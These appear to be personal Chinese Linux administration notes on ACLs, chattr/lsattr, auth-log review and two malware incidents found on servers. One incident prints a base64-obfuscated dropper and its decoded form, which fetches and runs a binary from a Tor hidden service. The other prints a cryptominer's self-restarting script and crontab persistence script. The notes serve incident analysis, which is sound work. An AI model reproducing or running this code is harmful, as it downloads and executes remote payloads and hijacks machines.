为了验证 pt 用户对于 /project 目录没有写权限，我们用 su 命令切换到 pt 用户，然后进入 /project 目录，在此目录下创建文件，看是否能成功：

上面提示权限不够，说明 acl 权限赋予成功，注意如下所示，如果某个目录或文件下有 + 标志，说明其具有 acl 权限。






5、查看 ACL 权限：getfacl 文件名



6、最大有效权限 mask
　　前面第4点我们讲过，我们给用户或用户组设定 ACL 权限其实并不是真正我们设定的权限，是与 mask 的权限“相与”之后的权限才是用户的真正权限，一般默认mask权限都是rwx，与我们所设定的权限相与就是我们设定的权限。

　　我们通过 getfacl 文件名 也能查看 mask 的权限，那么我们怎么设置呢？
setfacl -m m:权限 文件名




7、删除 ACL 权限
(1)、删除指定用户的 ACL 权限
setfacl -x u:用户名 文件名
(2)、删除指定用户组的 ACL 权限
setfacl -x g:组名 文件名
(3)、删除文件的所有 ACL 权限
setfacl -b 文件名



8、递归 ACL 权限
通过加上选项 -R 递归设定文件的 ACL 权限，所有的子目录和子文件也会拥有相同的 ACL 权限。
setfacl -m u:用户名:权限 -R 文件名




9、默认 ACL 权限
如果给父目录设定了默认的 ACL 权限，那么父目录中所有新建的子文件会继承父目录的 ACL 权限。
setfacl -m d:u:用户名:权限 文件名



10、总结
本篇博客我们介绍了权限管理的ACL权限，通过设定 ACL 权限，我们为某个用户指定某个文件的特定权限，在实际权限管理中还是用的比较多的。







ref:
linux
https://www.cnblogs.com/ysocean/p/7801329.html 
http://c.biancheng.net/view/863.html


一般化 https://blog.csdn.net/tch918/article/details/10019523 






========================================
遇到一个root删除失败的文件！ chattr（Change Attribute）命令 / lsattr: setting flags with root
----------------------------------------
为了防止在 Linux 系统中意外删除一些重要文件或目录，除了必要的备份之外，还有一个好方法，就是使用 chattr（Change Attribute）命令

在类 Unix 等发行版中，该命令能够有效防止文件和目录被意外的删除或修改。file 文件在 Linux 中被描述为一个数据结构，chattr 命令在大多数现代 Linux 操作系统中是可用的，可以修改file属性，一旦定义文件的隐藏属性，那么该文件的拥有者和 root 用户也无权操作该文件，只能解除文件的隐藏属性。

需要 root 权限才能设置该 附加权限。


1. 无法删除！
$ sudo rm aa.txt
rm: cannot remove 'aa.txt': Operation not permitted


查看发现有 -i 属性，就是系统不允许对这个文件进行任何的修改
$ lsattr aa.txt
----i---------e--- aa.txt


去掉该属性
$ sudo chattr -i aa.txt

$ lsattr aa.txt
--------------e--- aa.txt

$ rm aa.txt
## 成功删除







2. 命令详解

(1) 命令语法
chattr [operator] [switch] [file]

常用 switch 属性主要是 i 和 a
	+a:  只能给文件追加内容，但是删除不了，也不能改文件名。
		$ chattr +a  /etc/passwd

	加锁：chattr +i  /etc/passwd       文件不能删除，不能更改，不能移动
	查看加锁： lsattr /etc/passwd      文件加了一个参数 i 表示锁定
	解锁：chattr -i /home/omd/h.txt    - 表示解除属性



a)operator 具有如下操作符：
	操作符 +，追加指定属性到文件已存在属性中
	操作符 -，删除指定属性
	操作符 =，直接设置文件属性为指定属性


b)switch 常用属性指令如下
	A：即Atime，告诉系统不要修改对这个文件的最后访问时间。
	S：即Sync，一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘。
		S：即时更新文件或目录；

	a：即Append Only，系统只允许在这个文件之后追加数据，不允许任何进程覆盖或截断这个文件。
		a 如果目录具有这个属性，系统将只允许在这个目录下建立和修改文件，而不允许删除任何文件。
	b：不更新文件或目录的最后存取时间。
	c：将文件或目录压缩后存放。
	d：当dump程序执行时，该文件或目录不会被dump备份。
		d: A file with the 'd' attribute set is not a candidate for backup when the dump(8) program is run.
		d：将文件或目录排除在 dump 操作之外；
	D:检查压缩文件中的错误。
	i：即Immutable，系统不允许对这个文件进行任何的修改。
		i 如果目录具有这个属性，那么任何的进程只能修改目录之下的文件，不允许建立和删除文件。
		i：不得任意更动文件或目录；
	s：彻底删除文件，不可恢复，因为是从磁盘上删除，然后用0填充文件所在区域。
		s：保密性删除文件或目录；
	u：当一个应用程序请求删除这个文件，系统会保留其数据块以便以后能够恢复删除这个文件，用来防止意外删除文件或目录。
		u：预防意外删除。
	t:文件系统支持尾部合并（tail-merging）。
	X：可以直接访问压缩文件的内容。

	e: The 'e' attribute indicates that the file is using extents for mapping the blocks on disk.
		It may not be removed using chattr(1). #ext4硬盘格式，不能使用 chattr 去除




c)其它参数
-R：递归处理，将指令目录下的所有文件及子目录一并处理；
-v<版本编号>：设置文件或目录版本；
-V     Be verbose with chattr's output and print the program version.
	-V：显示指令执行过程
-f     Suppress most error messages.
-v version   Set the file's version/generation number.



(2) lsattr 查看文件或者目录的隐藏权限
-a：查看所有包括隐藏文件(.开头的文件)
-d：查看当前目录的隐藏权限，而不是列出其内容

-R：查看目下所有文件的隐藏权限
-V     Display the program version.
-l     Print the options using long names instead of single character abbreviations.
	打印长名字，而不是缩写

-p     List the file's project number.
-v     List the file's version/generation number.








3. 实例

(1) 设置[文件]不能被改名,移动删除,增删数据: i file

vim 新建文本文件，
$ cat log1.txt
line 1

$ ls -lth
total 4.0K
-rw-rw-r-- 1 wang wang 7 Apr 20 13:18 log1.txt

$ lsattr log1.txt
--------------e------- log1.txt

e属性什么意思？ 见上文 2.1b：可能仅仅表示文件系统是 ext4 格式的。

为什么不让设置？
$ chattr +i log1.txt 
chattr: Operation not permitted while setting flags on log1.txt

有说需要管理员权限，测试发现确实需要root执行：
$ sudo chattr +i log1.txt
$ lsattr log*
----i---------e------- log1.txt

追加失败：
$ echo "line2\n" >> log1.txt
-bash: log1.txt: Operation not permitted
管理员权限也不能修改：
$ sudo echo "line2\n" >> log1.txt
-bash: log1.txt: Operation not permitted

除非删除i权限，否则无法修改。


b) 删除特殊i权限
一般用户不能删除i权限
$ chattr -i log1.txt
chattr: Operation not permitted while setting flags on log1.txt

$ sudo chattr -i log1.txt
$ lsattr log1.txt
--------------e------- log1.txt

追加成功：
$ echo "line2\n" >> log1.txt
$ cat log1.txt
line 1
line2\n




(2) 设置[目录]不能建立,移动和删除文件：i dir
$ mkdir mylogs && touch mylogs/1.txt
$ tree
.
├── log1.txt
├── log2.txt
└── mylogs
    └── 1.txt

$ lsattr mylogs/
--------------e------- mylogs/1.txt

只能使用管理员权限添加-i属性
$ chattr +i -R mylogs/
chattr: Operation not permitted while setting flags on mylogs/
$ sudo chattr +i -R mylogs/
$ lsattr mylogs/
----i---------e------- mylogs/1.txt

怎么查目录的附加权限，而不是其中的文件呢？使用 -d 参数
$ lsattr -d mylogs/
----i---------e------- mylogs/


测试：在 mylogs 下创建目录，提示不允许
$ mkdir mylogs/today
mkdir: cannot create directory ‘mylogs/today’: Operation not permitted
$ sudo mkdir mylogs/today
mkdir: cannot create directory ‘mylogs/today’: Operation not permitted

测试：追加数据，依旧是提示不允许
$ echo "line 3" >> mylogs/1.txt
-bash: mylogs/1.txt: Operation not permitted
$ sudo echo "line 3" >> mylogs/1.txt
-bash: mylogs/1.txt: Operation not permitted


b) 删除附加i权限
$ chattr -i -R mylogs/
chattr: Operation not permitted while setting flags on mylogs/
$ sudo chattr -i -R mylogs/

追加数据 
$ echo "line 3" >> mylogs/1.txt
$ cat mylogs/1.txt
line 3
新建文件夹
$ mkdir mylogs/today
$ ls -lth mylogs/
total 8.0K
drwxrwxr-x 2 wang wang 4.0K Apr 20 13:53 today
-rw-rw-r-- 1 wang wang    7 Apr 20 13:52 1.txt




(3) 设置[文件]只能添加数据,不能修改,删除,移动该文件：a file

$ sudo chattr +a log2.txt
$ lsattr log2.txt
-----a--------e------- log2.txt

可以添加：
$ cat log2.txt
line 1 in log2
$ echo "line2" >> log2.txt
$ cat log2.txt
line 1 in log2
line2

不能修改文件名：
$ mv log2.txt log3.txt
mv: cannot move 'log2.txt' to 'log3.txt': Operation not permitted
$ sudo mv log2.txt log3.txt
mv: cannot move 'log2.txt' to 'log3.txt': Operation not permitted





(4) 设置[目录]下只能添加目录,文件, 但是不能对里面的文件夹,文件修改,移动,删除: a dir
$ lsattr mylogs/
--------------e------- mylogs/1.txt
--------------e------- mylogs/today
$ lsattr -d mylogs/
--------------e------- mylogs/

对目录添加-a属性：
$ sudo chattr +a -R mylogs
$ lsattr mylogs/
-----a--------e------- mylogs/1.txt
-----a--------e------- mylogs/today
$ lsattr -d mylogs/
-----a--------e------- mylogs/

能添加目录：
$ mkdir mylogs/yestoday
$ ls -lth mylogs/
total 12K
drwxrwxr-x 2 wang wang 4.0K Apr 20 14:00 yestoday
drwxrwxr-x 2 wang wang 4.0K Apr 20 13:53 today
-rw-rw-r-- 1 wang wang    7 Apr 20 13:52 1.txt

不能修改目录名
$ sudo mv mylogs/today mylogs/today2
mv: cannot move 'mylogs/today' to 'mylogs/today2': Operation not permitted

不能删除文件
$ sudo rm mylogs/1.txt
rm: cannot remove 'mylogs/1.txt': Operation not permitted

不能修改文件内容：vim 修改报错，不能写！
但是只能在最后追加内容：
$ date >> mylogs/1.txt
$ cat mylogs/1.txt
line 3
Sat Apr 20 14:03:14 CST 2024









4. linux 设置只读文件夹，其中的文件和文件夹不允许做任何修改：不执行递归的情况下怎么实现?

对于同时有i和a属性的文件夹，会怎么样呢？
	a 如果目录具有这个属性，系统将只允许在这个目录下建立和修改文件，而不允许删除任何文件。
	i 如果目录具有这个属性，那么任何的进程只能修改目录之下的文件，不允许建立和删除文件。
	测试：
		不能：新建文件，文件夹，修改文件名，删除文件和文件夹

三种设置：
	$ sudo chattr +a mylogs #a是只允许新增：新建文件/文件夹，追加文件。
	$ sudo chattr +i mylogs
	$ sudo chattr +a +i mylogs
	
	检查：
	$ lsattr mylogs/
	$ lsattr mylogs/ -d


九种测试:
	$ touch mylogs/file1
	$ rm mylogs/1.txt
	$ vim mylogs/1.txt
	$ date >> mylogs/1.txt
	$ mv mylogs/1.txt mylogs/2.txt

	$ mkdir mylogs/dir1
	$ rm -rf mylogs/today
	$ touch mylogs/today/2.txt
	$ mv mylogs/today mylogs/today2

         仅a /仅i /a+i /a-w /diff(a/i)
file 新建 Y/  n/   n/   n/    *
file 删除 n/  n/   n/   n/
file 修改 Y/  Y/   Y/   Y/    能修改文件
file 追加 Y/  Y/   Y/   Y/
file 修改文件名 n/ n/ n/ n/

dir 新建 Y/  n/  n/  n/       *
dir 删除 n/  n/  n/  n/
dir 新建子文件 Y/ Y/ Y/ Y/
dir 修改目录名 n/ n/ n/ n/


a+w竟然还能修改文件内容！
	不能删除，但是新建的文件可以删除。

单个 a 则只能在末尾添加。
试试 +a -w 结果是一样的：
	$ chmod a-w mylogs
	$ sudo chattr +a mylogs

//todo 没有实现，还需要递归。


ref:
https://www.cnblogs.com/ftl1012/p/chattr.html








========================================
日志查询-登录失败日志 auth.log，系统日志 journalctl
----------------------------------------
1. ubuntu的日志位置
通常 SSH 日志位于 /var/log/auth.log[Ubuntu] 或 /var/log/secure[CentOS]。
	/var/log/auth.log 或 /var/log/secure 存储来自可插拔认证模块(PAM)的日志，包括成功的登录，失败的登录尝试和认证方式。
	/var/log/syslog：只记录警告信息，常常是系统出问题的信息，使用lastlog查看 

ssh登录日志:
$ sudo cat /var/log/auth.log  | tail -n 100 | grep -in invalid
...
83:Sep  4 15:03:39 YStation sshd[2030096]: Invalid user ishimizu from 127.0.0.1 port 47414
86:Sep  4 15:03:41 YStation sshd[2030096]: Failed password for invalid user ishimizu from 127.0.0.1 port 47414 ssh2
87:Sep  4 15:03:42 YStation sshd[2030096]: Connection closed by invalid user ishimizu 127.0.0.1 port 47414 [preauth]
88:Sep  4 15:03:47 YStation sshd[2030114]: Invalid user xiat from 127.0.0.1 port 52658
91:Sep  4 15:03:50 YStation sshd[2030114]: Failed password for invalid user xiat from 127.0.0.1 port 52658 ssh2
92:Sep  4 15:03:50 YStation sshd[2030114]: Connection closed by invalid user xiat 127.0.0.1 port 52658 [preauth]

$ sudo cat /var/log/syslog | head
Apr 22 00:05:40 sustc-HG colord[1089]: message repeated 4 times: [ failed to get session [pid 14373]: No data available]
Apr 22 00:06:12 sustc-HG anacron[14292]: Job `cron.daily' terminated
Apr 22 00:06:12 sustc-HG anacron[14292]: Normal exit (1 job run)
Apr 22 00:15:01 sustc-HG CRON[14542]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
Apr 22 00:17:01 sustc-HG CRON[14546]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
Apr 22 00:25:01 sustc-HG CRON[14556]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)


[CentOS]$ sudo cat /var/log/secure | tail -n 10 | grep -in sudo
1:Sep  4 15:16:31 humpopg-svr3 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)
2:Sep  4 15:16:31 humpopg-svr3 sudo: pam_unix(sudo:session): session closed for user root



2. 查看登录失败的id
通过查看auth.log，可以分析出用户尝试登录情况，以及退出历史；这里也可以看出有一些非法用户尝试暴力破解或尝试相关用户密码，如果经常这样，就需要找出合理的防范措施，例如，修改默认的ssh端口号，将超级用户密码设置的更合理更复杂些，并定期做出修改等，避免被某些黑客劫持住并作为肉鸡使用。

$ sudo cat /var/log/auth.log | grep Fail | head
Apr 19 01:50:12 sustc-HG sshd[32269]: Failed password for root from 192.168.2.1 port 44398 ssh2
Apr 19 01:50:35 sustc-HG sshd[32271]: Failed password for root from 192.168.2.1 port 55742 ssh2
Apr 19 01:50:54 sustc-HG sshd[32274]: Failed password for root from 192.168.2.1 port 38852 ssh2
Apr 19 01:51:13 sustc-HG sshd[32276]: Failed password for root from 192.168.2.1 port 50196 ssh2
Apr 19 01:51:33 sustc-HG sshd[32278]: Failed password for root from 192.168.2.1 port 33308 ssh2



ubuntu查看日志中访问次数前十的ip
$ sudo cat /var/log/auth.log | grep Fail | awk -F"from" '{print $2}'|cut -d ' ' -f 2 | sort|uniq -c|sort -nr | head






3. 查看系统日志：journalctl -xb

基本用法：journalctl [options]
常用选项：
	-f：实时追踪日志输出。
	-n：显示指定数量的日志行。
	-u unit：仅显示指定单元的日志。
	-k：显示内核消息。
	-b：显示引导过程的日志。
	-p priority：仅显示指定优先级的日志。
	-e：直接定位到日志的末尾。
	--since time：显示指定时间之后的日志。
	--until time：显示指定时间之前的日志。
	--disk-usage：显示日志占用的磁盘空间情况。
#


$ sudo journalctl -xb | tail
Sep 02 16:28:53 humpopg-svr3.icb.ac.cn rserver[29272]: ERROR CLIENT EXCEPTION (rsession-wangyuzhou): TypeError: Cannot read properties of undefined (reading 'singular');|||http://10.10.118.143:8787/rstudio/5D3EB8D016DDDA0665CB8CD8EEA6C537.cache.js#-1::showTooltip|||com/google/gwt/animation/client/Animation.java#29::this$01|||http://10.10.118.143:8787/rstudio/5D3EB8D016DDDA0665CB8CD8EEA6C537.cache.js#-1::anonymous|||Client-ID: c35eafa2-9a24-4be7-814b-52ecfb9ff13e|||User-Agent: Mozilla/5.0 (Windows NT 10.0  Win64  x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0


查询最新的错误信息
$ sudo journalctl -xb | tail -n 1000| grep -in error






ref:
https://www.jianshu.com/p/989a0e36aa6a
https://www.imooc.com/article/28635






========================================
今天服务器CPU爆表，占用最高的进程最终追踪到这个脚本。这就是暗网？
----------------------------------------
1. 2020.6.27 症状是96个CPU核(总数的一半)100%运行，删掉还是会自启动，都是用root权限运行的。

$cat /opt/unixdb.sh
#!/bin/bash
exec &>/dev/null
echo yyANhZDFOs31F9WgqOovurruEMT3Z+v82MG0m9elafh8GU1+u4/78NZoKz2rA7O2
echo eXlBTmhaREZPczMxRjlXZ3FPb3Z1cnJ1RU1UM1ordjgyTUcwbTllbGFmaDhHVTErdTQvNzhOWm9LejJyQTdPMgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ1bml4ZGJudWFkeG13dG9iIikKCnNvY2t6KCkgewpuPShkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgdW5jZW5zb3JlZC5hbnkuZG5zLm5peG5ldC54eXopCnA9JChlY2hvICJkbnMtcXVlcnk/bmFtZT1yZWxheS50b3Iyc29ja3MuaW4iKQpzPSQoJGMgaHR0cHM6Ly8ke25bJCgoUkFORE9NJTUpKV19LyRwIHwgZ3JlcCAtb0UgIlxiKFswLTldezEsM31cLil7M31bMC05XXsxLDN9XGIiIHx0ciAnICcgJ1xuJ3xzb3J0IC11UnxoZWFkIC0xKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAkZCAvdG1wIC92YXIvdG1wIC9kZXYvc2htIC91c3IvYmluIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmZXhlCmY9L2ludC4kKHVuYW1lIC1tKQp4PS4vJChkYXRlfG1kNXN1bXxjdXQgLWYxIC1kLSkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IHx8ICRjICQxJGYgLW8keApjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuY2ggdG9yMndlYi5pbyB0b3Iyd2ViLnRvIHRvcjJ3ZWIuc3UKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLTEgL3RtcC8uWDExLXVuaXgvMDApL3N0YXR1czsgdGhlbgp1ICR0LiRoCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash


主程序是base64加密过的。




2. 最后一行解码后展开
yyANhZDFOs31F9WgqOovurruEMT3Z+v82MG0m9elafh8GU1+u4/78NZoKz2rA7O2
exec &>/dev/null
export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
c=$(echo "curl -4fsSLkA- -m200")
t=$(echo "unixdbnuadxmwtob")

sockz() {
	n=(dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org uncensored.any.dns.nixnet.xyz)                                                                                                     
	p=$(echo "dns-query?name=relay.tor2socks.in")
	s=$($c https://${n[$((RANDOM%5))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)
}

fexe() {
	for i in $d /tmp /var/tmp /dev/shm /usr/bin ;
	do 
		echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;
	done 
}

u() {
	sockz
	fexe
	f=/int.$(uname -m)
	x=./$(date|md5sum|cut -f1 -d-)
	$c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
	# chmod +x $x;$x;rm -f $x #这一句可能有危害，已经注释掉了。确定想测试一下危害，请去掉前面的注释符。
}

for h in tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su
do
	if ! ls /proc/$(head -1 /tmp/.X11-unix/00)/status; then
		u $t.$h
		else
		break
	fi
done





3. 逐行分析
(1) sockz() 函数
curl -4fsSLkA- -m200 一个http网址，随机5选1主域名，比如  https://dns.twnic.tw/dns-query?name=relay.tor2socks.in
浏览器打开后是：
{"Status":0,"TC":false,"RD":true,"RA":true,"AD":false,"CD":false,"Question":[{"name":"relay.tor2socks.in.","type":1}],"Answer":[{"name":"relay.tor2socks.in.","type":1,"TTL":2389,"Expires":"Sat, 27 Jun 2020 06:19:21 UTC","data":"91.134.214.222"},...
{"name":"relay.tor2socks.in.","type":1,"TTL":2389,"Expires":"Sat, 27 Jun 2020 06:19:21 UTC","data":"128.65.194.136"}],"edns_client_subnet":"116.6.234.0/0"}

grep 匹配出IP，然后tr替换掉空格，然后sort -u是unique, -R是随机排序，然后head拿到第一个IP地址，赋值给s

(2) fexe() 不清楚干啥的
(3) $c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
访问(1)中s给出的IP的9050端口，前面定义过t，合起来就是 unixdbnuadxmwtob.onion/initx86_64
x是一个日期的md5码，相当于随机数
curl -4fsSLkA- -m200 -x socks5h://145.239.64.40:9050 unixdbnuadxmwtob.onion/initx86_64 -o ./f36a6ba953e465270ecc0fb97bc7dcb6
动作要快，否则IP可能失效，导致下载失败。可以使用原脚本，删除掉运行那一行。
下载到一个26k的文件。不知道是干啥的，不敢运行。



========================================
|-- 又遇到一个挖矿的 on 工作站上
----------------------------------------

1. 显示 shell 巨慢，打开 htop 可拿到 swp 占用很大: 1.77G / 2G
htop 看到一个 zxl 用户在运行一个带端口的命令
关键词 /tmp/eth/./ethminer -P stratuml+tcp://0x6e819xxxx.wjl:thelegenddavid123@yahoo.com@eth-asial.nanopool.org:9999 --report-hashrate

百度了一下，是在挖矿。
--> Ethminer挖矿软件使用教程_Public net-CSDN博客_ethminer


(1) 先关掉账号

1) 如何暂停一个用户？
如果你只是想让某一用户“暂时不启用”，将/etc/shadow里最后 倒数第二个字段(最后2个:之间)设置为0，就可以让改账号无法使用。
参考上面的/etc/shadow介绍可知，将账号立即失效。

$ su sam
Password: 
Your account has expired; please contact your system administrator
su: Authentication failure


2) 如何冻结一个账号？
冻结前:
sam:x:1002:1002::/usr/sam:/bin/bash
冻结
$ sudo passwd -l sam
passwd: password expiry information changed.
冻结后
$ su sam
Password: 
su: Authentication failure
看来是这里第一个:后加了个!号。
sam:!$6$oFDnwxS.$sDnfS1VtQ2e48K3fzvlIAfqknq.kiqKwifwKjRD4yJJX2e.CChszRwAIo4qzEqGB8V7fV.qpTzFkkKdz5XKei.:17708:0:99999:7:::

密码冻结解开 
$ sudo passwd -u sam
passwd: password expiry information changed.

可登陆了。
sam:$6$oFDnwxS.$sDnfS1VtQ2e48K3fzvlIAfqknq.kiqKwifwKjRD4yJJX2e.CChszRwAIo4qzEqGB8V7fV.qpTzFkkKdz5XKei.:17708:0:99999:7:::




3) 实施冻结账号
$ sudo passwd -l zxl
[sudo] password for wangjl: 
passwd: password expiry information changed.


$ sudo vim /etc/shadow
最后2个:之间添加0.






(2) 清理挖矿的程序
$ cd /tmp/eth/
$ ls -lth
total 6.8M
-rwxr-xr-x 1 zxl zxl  956 Jan  4 09:54 run
-rwxr-xr-x 1 zxl zxl  290 Jan  4 09:53 1
-rwxr-xr-x 1 zxl zxl 6.8M Jan  4 09:53 ethminer

也就是从1月4日 就开始了。
主程序是 ethminer，其余两个是脚本，每5秒检测一次，防止自己被干掉。
需要写一个脚本，一次关掉所有进程，并修改这个文件夹的名字。

$ ps -aux | grep ^zxl | awk '{print $2}'
4724
4727
15933
15934
17526
19867
29597

## 
$ cat 01.sh
ps -aux | grep ^zxl | awk '{print $2}' | xargs -i kill -9 {}
mv /tmp/eth /tmp/eth2

$ sudo bash 01.sh

安静了!





1)
$ vim 1
#!/bin/bash
locatie=$(cat /var/tmp/.logs/.local)

if ! pgrep -x ethminer >/dev/null; then
        $locatie/./ethminer -P stratum1+tcp://0x6e8195519e42e937f83a61bc8c9b3ae62641bc77.w1:thelegenddavid123@yahoo.com@eth-asia1.nanopool.org:9999 --report-hashrate > /dev/null 2>&1 & disown $*
else
        :
fi



2) 
$ vim run 
#!/bin/bash
if [ $# != 1 ]; then
        echo " usage: $0 > /dev/null 2>&1 & disown"
fi

locatie=$(cat /var/tmp/.logs/.local)
if [ -f /var/tmp/.logs/.local ]; then
        :
else
        if [ -d /var/tmp/.logs ]; then
                echo $(pwd) > /var/tmp/.logs/.local
        else
                mkdir /var/tmp/.logs
                echo $(pwd) > /var/tmp/.logs/.local
        fi
fi

crontabcalumea() {
        if ! crontab -l | grep -q 'run'; then
                rm -rf $(cat /var/tmp/.logs/.local)/.tempo
                echo "@daily $(cat /var/tmp/.logs/.local)/1" >> $(cat /var/tmp/.logs/.local)/.tempo
                sleep 1
                echo "@reboot $(cat /var/tmp/.logs/.local)/run > /dev/null 2>&1 & disown" >> $(cat /var/tmp/.logs/.local)/.tempo
                sleep 1
                echo "@monthly $(cat /var/tmp/.logs/.local)/run  > /dev/null 2>&1 & disown" >> $(cat /var/tmp/.logs/.local)/.tempo
                sleep 1
                crontab $(cat /var/tmp/.logs/.local)/.tempo
                sleep 1
                rm -rf $(cat /var/tmp/.logs/.local)/.tempo
        fi
}


sleep 5
while :
do
$(cat /var/tmp/.logs/.local)/1
crontabcalumea
sleep 5
done






(3) 检查有 sudo 权限的用户

$ sudo vim /etc/sudoers

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL


/etc/group 中 
	admin 的组id号是116 lpadmin:x:116:hgyi
	sudo 的组id号是27 sudo:x:27:hgyi

/etc/passwd 下存放的是用户的属性，
依次是用户名:密码占位符:用户ID:组ID……
比如test1:x:501:500………… 则500就是组id


还有另外一种可能就是附加组。这个的话直接看/etc/group下就知道了，如果这个组是属于某用户的附加组，会在这个组后面直接显示成员。
比如cat /etc/group
test:x:500:test3,test4
test3和test4也属于test组，不过这个是附加组。







========================================
|-- 又遇到一次服务器 CPU 爆表的，莫名其妙好了
----------------------------------------

==>又一次遇到病毒了: 2022.5.2 13:48 所有CPU被占满，内存还有至少一半。
几乎是在一瞬间执行的。


1.查看进程
top 看，CPU 用的最多的是 wuxc 的 Rstudio 用户。
htop 看，CPU 占用最多的是 root 的 /usr/bin/containerd 进程，不过也仅仅是 100%。
也就是说，只能看到 htop 满屏幕都是红的，但是排名靠前的CPU使用率又不高，只有不到3个 100%。
只能在 top 中P排序看到一堆100%的进程，用户名是 wuxc，查看是一个普通用户，不在 docker 组。

$ sudo ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep "wuxc" | head
$ sudo ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep "wuxc" | awk '{print $3}' | xargs kill -9

$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep "wuxc" | awk '{print $3}'| xargs sudo kill -9
以上命令没有用，使用完依旧htop 中 CPU 全红。


(1)怀疑是 docker 中的病毒程序？

* stop 所有的 docker 容器: docker stop xx
	检查 docker ps -a 没有run状态的容器了。
* kill 掉 /usr/bin/containerd 进程
	$ ps -A -o stat,pid,ppid,cmd,uid,uname | grep "/usr/bin/containerd" #没有匹配条
	$ ps -A -o stat,pid,ppid,cmd,uid,uname | grep "contain" #没有匹配条
	$ docker ps -a
	# Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
* 然后再次杀 top 中的进程 
	$ ps -aux | head
	USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
	root          1  0.0  0.0 196264  6632 ?        Ss    2021 145:33 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
	root          2  0.0  0.0      0     0 ?        S     2021  22:37 [kthreadd]


	这个就很奇怪！！rserver-pam 是啥？
	$ ps -aux | grep "wuxc" | head
	root        794  1.0  0.0 154936  4492 ?        Sl   14:12   0:01 /usr/lib/rstudio-server/bin/rserver-pam wuxc rstudio 1
	wangjl     1432 11.0  0.0 123692  1284 pts/64   S+   14:14   0:00 grep --color=auto wuxc
	wuxc     148274  0.1  0.0      0     0 ?        R    Apr30   3:53 [rsession]
	wuxc     148275  0.0  0.0      0     0 ?        R    Apr30   2:48 [rsession]

	$ sudo kill -9 794

	$ ps -aux | grep "wuxc" | awk '{print $2}'| xargs sudo kill -9
	报错: kill: sending signal to 175534 failed: No such process



(2) 关掉端口 2375 
https://blog.csdn.net/u012359651/article/details/104443955

$ sudo iptables --list
看不太懂，内容太多了。


另一台主机检查端口，该端口不通，8888是通的。
$ telnet 172.18.5.193 2375
Trying 172.18.5.193...
telnet: Unable to connect to remote host: No route to host



世界突然就安静了，我啥也没干，周波登录了wuxc的Rstudio界面，然后啥也没干。



(3) 杀僵尸进程
$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep "^[Zz]" | awk '{print $4}' | sort | uniq -c | sort -k1nr
     45 alamin
     34 wangjl
     17 zhoub
      9 wuxc
      2 caow
      1 huangcy
      1 root

$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep "^[Zz]"  | grep wangjl
Z+   388783  16903 wangjl   [top] <defunct>              1012 wangjl
Z+   405296  16916 wangjl   [htop] <defunct>             1012 wangjl
Z+   405296  23273 wangjl   [htop] <defunct>             1012 wangjl
Z+   388783  23298 wangjl   [top] <defunct>              1012 wangjl
Z+    29749  29750 wangjl   [bash] <defunct>             1012 wangjl
Z+    29747  29751 wangjl   [ps] <defunct>               1012 wangjl
Z+    29747  29754 wangjl   [ps] <defunct>               1012 wangjl
Z+    29747  29779 wangjl   [ps] <defunct>               1012 wangjl
...
Z+   405296 405425 wangjl   [htop] <defunct>             1012 wangjl
Z+   405296 405805 wangjl   [htop] <defunct>             1012 wangjl
Z+   405296 425585 wangjl   [htop] <defunct>             1012 wangjl


浏览z的进程
$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep "^[Zz]" | grep wangjl | awk '{print $3}'

开始终止这些 ppid
$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep "^[Zz]" | grep wangjl | awk '{print $2}' | sort | uniq | xargs kill -9

再次查看z进程
$ ps -A -o stat,ppid,pid,user,cmd,uid,uname | grep "^[Zz]" | grep wangjl





